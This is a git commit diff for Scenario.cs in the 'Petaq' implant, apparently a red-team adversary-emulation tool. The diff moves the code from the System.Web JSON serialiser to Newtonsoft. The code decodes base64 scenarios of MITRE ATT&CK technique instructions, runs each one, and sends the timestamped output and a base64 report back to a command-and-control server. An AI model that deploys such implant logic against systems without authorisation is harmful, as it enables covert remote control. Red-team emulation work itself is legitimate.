36e39b4cb3534be89fad8613069d7b629dd76e93
Fatih Ozavci <fatih.ozavci@viproy.com>
2020-09-30 13:22:17 +1000

    JSON update for Newtonsoft instead of System.Web

--- petaqimplant/Scenario.cs
+++ petaqimplant/Scenario.cs
@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Text;
-using System.Web.Script.Serialization;
 using System.Text.RegularExpressions;
 using System.Net;
 using System.IO;
@@ -14,6 +13,8 @@ using System.Collections.Generic;
 using System.Collections.Concurrent;
 using System.Threading;
 using System.Security.Cryptography;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 
 namespace PetaqImplant
 {
@@ -46,7 +47,6 @@ namespace PetaqImplant
 
         public static void Run(string scenario_b64)
         {
-            TTPs scenario_torun;
 
             // Set the socket as the Console output
             Program.consoleIO = Console.Out;
@@ -56,7 +56,74 @@ namespace PetaqImplant
             try
             {
                 string scenario_text = Encoding.UTF8.GetString(Convert.FromBase64String(scenario_b64));
-                scenario_torun = new JavaScriptSerializer().Deserialize<TTPs>(scenario_text);
+                dynamic scenario_torun = JsonConvert.DeserializeObject<TTPs>(scenario_text);
+
+                Console.WriteLine("Adversary emulation is starting...");
+
+                foreach (dynamic item in scenario_torun.scenario)
+                {
+                    // set an output StringWriter for each TTP 
+                    StringWriter ttp_output = new StringWriter();
+
+                    ttp_output.WriteLine("TTP: {0}\nName: {1}\n", item.mitreid, item.name);
+
+                    try
+                    {
+                        // set the start timestamp
+                        item.starttime = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+
+                        // run the instructions received
+                        for (int i = 0; i < item.instructions.Length; i++)
+                        {
+                            // print the original instruction
+                            ttp_output.WriteLine("Instruction: {0}", item.original_instructions[i]);
+                            ttp_output.WriteLine("Start Timestamp: {0}\n", item.starttime);
+
+                            // but exercute the updated instruction
+                            PetaqImplant.Instructions.Instruct(item.instructions[i], ttp_output);
+
+                            // recover the instruction to avoid high bandwith for file contents
+                            item.instructions[i] = item.original_instructions[i];
+                        }
+
+                        // set the result
+                        item.result = true;
+                    }
+                    catch (Exception ex)
+                    {
+                        // save the error message to the TTP output
+                        Console.WriteLine("Instruction failure:\n{0}", ex.ToString());
+
+                        // set the result
+                        item.result = false;
+                    }
+                    finally
+                    {
+                        // set the stop timestamp
+                        item.stoptime = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+                        ttp_output.WriteLine("Stop Timestamp: {0}\n", item.stoptime);
+
+                        // save the output to the TTP output
+                        ttp_output.Close();
+                        item.output = ttp_output.ToString();
+
+                        // Set the socket as the Console output
+                        Program.consoleIO = Console.Out;
+                        Console.SetOut(new SocketWriter());
+
+                        // Report the TTP result to the C2
+                        Console.WriteLine(item.output);
+                    }
+
+
+                }
+
+                Console.WriteLine("Serialising the scenario report");
+                string scenario_report = JsonConvert.SerializeObject(scenario_torun);
+
+                Console.WriteLine("Sending the report to the C2");
+                string scenario_report_b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(scenario_report));
+                Console.WriteLine("scenario_report "+scenario_report_b64);
             }
             catch (Exception ex)
             {
@@ -64,73 +131,9 @@ namespace PetaqImplant
                 return;
             }
 
-            Console.WriteLine("Adversary emulation is starting...");
-
-            foreach (var item in scenario_torun.scenario)
-            {
-                // set an output StringWriter for each TTP 
-                StringWriter ttp_output = new StringWriter();
-
-                ttp_output.WriteLine("TTP: {0}\nName: {1}\n", item.mitreid, item.name);
-
-                try
-                {                   
-                    // set the start timestamp
-                    item.starttime = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
-
-                    // run the instructions received
-                    for (int i = 0; i < item.instructions.Length; i++)
-                    {
-                        // print the original instruction
-                        ttp_output.WriteLine("Instruction: {0}", item.original_instructions[i]);
-                        ttp_output.WriteLine("Start Timestamp: {0}\n", item.starttime);
-
-                        // but exercute the updated instruction
-                        PetaqImplant.Instructions.Instruct(item.instructions[i], ttp_output);
-
-                        // recover the instruction to avoid high bandwith for file contents
-                        item.instructions[i] = item.original_instructions[i];
-                    }
-
-                    // set the result
-                    item.result = true;
-                }
-                catch (Exception ex)
-                {
-                    // save the error message to the TTP output
-                    Console.WriteLine("Instruction failure:\n{0}", ex.ToString());
-
-                    // set the result
-                    item.result = false;
-                }
-                finally
-                {
-                    // set the stop timestamp
-                    item.stoptime = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
-                    ttp_output.WriteLine("Stop Timestamp: {0}\n", item.stoptime);
-
-                    // save the output to the TTP output
-                    ttp_output.Close();
-                    item.output = ttp_output.ToString();
-
-                    // Set the socket as the Console output
-                    Program.consoleIO = Console.Out;
-                    Console.SetOut(new SocketWriter());
-
-                    // Report the TTP result to the C2
-                    Console.WriteLine(item.output);
-                }
-
-
-            }
-
-            Console.WriteLine("Serialising the scenario report");
-            string scenario_report = new JavaScriptSerializer().Serialize(scenario_torun);
-
-            Console.WriteLine("Sending the report to the C2");
-            string scenario_report_b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(scenario_report));
-            Console.WriteLine("scenario_report "+scenario_report_b64);
+            
 
         }
     }
 }
+
